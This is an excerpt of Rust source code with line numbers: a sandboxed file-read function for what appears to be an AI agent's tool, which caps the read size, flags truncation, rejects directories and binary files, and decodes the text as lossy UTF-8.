117pub fn read(sandbox: &Sandbox, path: &str) -> ReadOutcome {
118 let resolved = match resolve(sandbox, path) {
119 Ok(resolved) => resolved,
120 Err(error) => return ReadOutcome::failed(path, error),
121 };
122 if resolved.is_dir() {
123 return ReadOutcome::failed(path, format!("{path} is a directory, not a file"));
124 }
125 
126 // Read one byte past the cap: enough to know the file was longer without
127 // pulling a multi-gigabyte file into memory to find out.
128 let mut buffer = Vec::new();
129 let read = std::fs::File::open(&resolved).and_then(|file| {
130 file.take(MAX_READ_BYTES as u64 + 1)
131 .read_to_end(&mut buffer)
132 });
133 if let Err(e) = read {
134 return ReadOutcome::failed(path, format!("{path}: {e}"));
135 }
136 
137 let truncated = buffer.len() > MAX_READ_BYTES;
138 if truncated {
139 buffer.truncate(MAX_READ_BYTES);
140 }
141 // A NUL byte means this is not text. Sending a binary blob would waste the
142 // context window and tell the model nothing it can use.
143 if buffer.contains(&0) {
144 return ReadOutcome::failed(path, format!("{path} looks like a binary file"));
145 }
146 
147 // Lossy: a cut mid-character at the cap becomes U+FFFD rather than an error.
148 let contents = String::from_utf8_lossy(&buffer).into_owned();
149 ReadOutcome {
150 path: path.to_string(),
151 lines: contents.lines().count(),
152 contents,
153 truncated,
154 error: None,
155 }
156}
